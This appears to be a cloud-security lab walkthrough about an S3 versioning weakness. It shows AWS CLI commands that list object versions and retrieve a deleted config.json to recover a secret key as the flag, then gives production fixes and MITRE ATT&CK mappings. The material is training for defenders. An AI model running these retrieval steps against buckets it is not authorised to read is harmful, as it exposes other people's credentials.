# S3 Versioning — Deleted Object Recovery

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Storage / Versioning

## Scenario

A developer accidentally committed production credentials to S3 inside `app/config.json`.
After realising the mistake, they:
1. Replaced the file with a sanitised version referencing SSM/Secrets Manager
2. Ran `aws s3 rm` to delete it — thinking the history was gone

However, **S3 versioning retains every version of an object**, including those preceding a
delete marker. Any identity with `s3:ListBucketVersions` and `s3:GetObjectVersion` can
retrieve the original file containing the secret.

## Attack Path

```
[Attacker] s3-reader-<id> (s3:ListBucketVersions + s3:GetObjectVersion)
    |
    v
aws s3api list-object-versions  -->  three versions of app/config.json
    |
    v
Identify the earliest VersionId (the original committed file)
    |
    v
aws s3api get-object --version-id <v1>  -->  original config.json
    |
    v
.secret_key  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — List all versions of objects in the bucket

```bash
BUCKET="<bucket_name>"

aws s3api list-object-versions \
  --bucket "${BUCKET}" \
  --profile attacker \
  --query "{Versions:Versions[*].{Key:Key,VersionId:VersionId,LastModified:LastModified,IsLatest:IsLatest},DeleteMarkers:DeleteMarkers[*].{Key:Key,VersionId:VersionId}}"
```

### Step 3 — Retrieve the original (oldest) version

```bash
# Get the VersionId of the earliest version of app/config.json
V1=$(aws s3api list-object-versions \
  --bucket "${BUCKET}" \
  --prefix app/config.json \
  --profile attacker \
  --query "sort_by(Versions, &LastModified)[0].VersionId" \
  --output text)

aws s3api get-object \
  --bucket "${BUCKET}" \
  --key app/config.json \
  --version-id "${V1}" \
  --profile attacker \
  original_config.json

cat original_config.json
```

## How to Fix in Production

1. **Enable S3 Object Lock** or an S3 Lifecycle policy to expire non-current versions after N days.
2. **Treat any secret that touched S3** as compromised and rotate immediately, regardless of subsequent deletion.
3. **Restrict `s3:GetObjectVersion` and `s3:ListBucketVersions`** to the minimum set of identities — these actions are often overlooked in read-only policies.
4. **Use `aws s3api delete-objects` with explicit VersionIds** to permanently remove specific versions (not just create delete markers).
5. **Prevent secrets from reaching S3** using pre-commit hooks and secret scanning in CI.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Cloud Storage | T1530 |
| Cloud Storage Object Discovery | T1619 |
| Unsecured Credentials: Credentials in Files | T1552.001 |
